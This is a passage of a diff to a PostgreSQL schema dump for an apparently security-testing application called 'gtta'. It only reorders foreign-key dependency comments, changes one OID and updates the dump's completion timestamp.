 -- Name: target_check_solutions_check_solution_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3677,7 +3518,7 @@ ALTER TABLE ONLY target_check_solutions
 
 --
 -- TOC entry 2183 (class 2606 OID 27224)
--- Dependencies: 175 178 2115
+-- Dependencies: 175 2115 178
 -- Name: target_check_solutions_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3687,7 +3528,7 @@ ALTER TABLE ONLY target_check_solutions
 
 --
 -- TOC entry 2184 (class 2606 OID 27229)
--- Dependencies: 175 175 176 176 2111
+-- Dependencies: 176 2111 176 175 175
 -- Name: target_check_solutions_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3707,7 +3548,7 @@ ALTER TABLE ONLY target_check_vulns
 
 --
 -- TOC entry 2203 (class 2606 OID 27199)
--- Dependencies: 178 2115 191
+-- Dependencies: 178 191 2115
 -- Name: target_check_vulns_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3717,7 +3558,7 @@ ALTER TABLE ONLY target_check_vulns
 
 --
 -- TOC entry 2205 (class 2606 OID 27209)
--- Dependencies: 191 176 176 2111 191
+-- Dependencies: 176 176 191 191 2111
 -- Name: target_check_vulns_target_id_fkey1; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3727,7 +3568,7 @@ ALTER TABLE ONLY target_check_vulns
 
 --
 -- TOC entry 2204 (class 2606 OID 27204)
--- Dependencies: 180 2119 191
+-- Dependencies: 2119 180 191
 -- Name: target_check_vulns_user_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3737,7 +3578,7 @@ ALTER TABLE ONLY target_check_vulns
 
 --
 -- TOC entry 2185 (class 2606 OID 22030)
--- Dependencies: 2081 155 176
+-- Dependencies: 2081 176 155
 -- Name: target_checks_check_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3747,7 +3588,7 @@ ALTER TABLE ONLY target_checks
 
 --
 -- TOC entry 2186 (class 2606 OID 22035)
--- Dependencies: 2093 176 162
+-- Dependencies: 176 162 2093
 -- Name: target_checks_language_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3757,7 +3598,7 @@ ALTER TABLE ONLY target_checks
 
 --
 -- TOC entry 2187 (class 2606 OID 22040)
--- Dependencies: 178 176 2115
+-- Dependencies: 176 178 2115
 -- Name: target_checks_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3777,7 +3618,7 @@ ALTER TABLE ONLY target_checks
 
 --
 -- TOC entry 2189 (class 2606 OID 22050)
--- Dependencies: 2099 168 177
+-- Dependencies: 2099 177 168
 -- Name: target_references_reference_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3787,7 +3628,7 @@ ALTER TABLE ONLY target_references
 
 --
 -- TOC entry 2190 (class 2606 OID 22055)
--- Dependencies: 2115 178 177
+-- Dependencies: 178 2115 177
 -- Name: target_references_target_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3797,7 +3638,7 @@ ALTER TABLE ONLY target_references
 
 --
 -- TOC entry 2191 (class 2606 OID 27169)
--- Dependencies: 178 166 2097
+-- Dependencies: 166 2097 178
 -- Name: targets_project_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3806,8 +3647,8 @@ ALTER TABLE ONLY targets
 
 
 --
--- TOC entry 2192 (class 2606 OID 22065)
--- Dependencies: 2085 158 180
+-- TOC entry 2192 (class 2606 OID 28201)
+-- Dependencies: 158 180 2085
 -- Name: users_client_id_fkey; Type: FK CONSTRAINT; Schema: public; Owner: gtta
 --
 
@@ -3827,7 +3668,7 @@ GRANT ALL ON SCHEMA public TO postgres;
 GRANT ALL ON SCHEMA public TO PUBLIC;
 
 
--- Completed on 2012-12-02 02:20:39 MSK
+-- Completed on 2013-01-20 18:00:10 MSK
 
 --
 -- PostgreSQL database dump complete
